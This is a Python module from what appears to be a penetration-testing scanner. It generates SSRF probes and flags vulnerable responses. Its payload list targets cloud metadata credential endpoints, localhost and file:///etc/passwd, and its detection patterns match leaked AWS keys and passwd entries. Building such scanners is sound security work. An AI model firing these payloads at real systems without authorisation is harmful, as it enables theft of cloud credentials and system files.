"""Generic best-effort SSRF probes (metadata / localhost / file:// reflection).

Detection is passive: it flags cloud-metadata / file-read signatures reflected in
the response. There is no out-of-band listener — for true OOB confirmation, point
`canary_host` at a collaborator domain and watch it externally.
"""

from __future__ import annotations

import re

from penpine.attack.generator import PayloadGenerator
from penpine.attack.models import Confidence, Finding, Payload, TestCase
from penpine.attack.module import AttackModule
from penpine.attack.modules._common import (
    GENERIC_ERROR_SIGNATURES,
    body_text,
    error_signature,
    search_signatures,
)
from penpine.attack.types import AttackType
from penpine.attack.validator import Validator

CANARY_HOST = "penpine-oob.example"

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "file:///etc/passwd",
    f"http://{CANARY_HOST}/",
]

SSRF_SIGNATURES = [
    re.compile(p, re.I)
    for p in [
        r"\bami-id\b",
        r"\binstance-id\b",
        r"\biam/security-credentials\b",
        r"computeMetadata",
        r'"AccessKeyId"',
        r"root:x:0:0:",
        r"\bmeta-data\b",
    ]
]


class SsrfGenerator(PayloadGenerator):
    def __init__(self, payloads=None, canary_host=CANARY_HOST):
        if payloads is not None:
            self._payloads = list(payloads)
        else:
            self._payloads = [p.replace(CANARY_HOST, canary_host) for p in SSRF_PAYLOADS]

    def generate(self, point, request):
        for value in self._payloads:
            yield TestCase(
                point=point, payload=Payload(value, technique="ssrf"), attack_type=AttackType.SSRF
            )


class SsrfValidator(Validator):
    def __init__(self, signatures=None, error_signatures=None):
        self._signatures = list(signatures) if signatures is not None else list(SSRF_SIGNATURES)
        self._errors = (
            list(error_signatures)
            if error_signatures is not None
            else list(GENERIC_ERROR_SIGNATURES)
        )

    def evaluate(self, test_case, response, baseline=None):
        match = search_signatures(body_text(response), self._signatures)
        if match is not None:
            if baseline is not None and search_signatures(body_text(baseline), self._signatures):
                return None
            return Finding(
                AttackType.SSRF,
                test_case.point,
                test_case.payload,
                Confidence.MEDIUM,
                f"internal/metadata content reflected: {match.group(0)[:60]}",
                request=test_case.request,
                response=response,
            )
        err = error_signature(response, baseline, self._errors)
        if err is not None:
            return Finding(
                AttackType.SSRF,
                test_case.point,
                test_case.payload,
                Confidence.LOW,
                f"server-side fetch error: {err.group(0)[:60]}",
                request=test_case.request,
                response=response,
            )
        return None


SSRF_MODULE = AttackModule(
    "ssrf",
    SsrfGenerator(),
    SsrfValidator(),
    attack_type=AttackType.SSRF,
    applies_to=("param", "form", "json", "header"),
    description="best-effort SSRF (metadata/localhost/file reflection)",
)
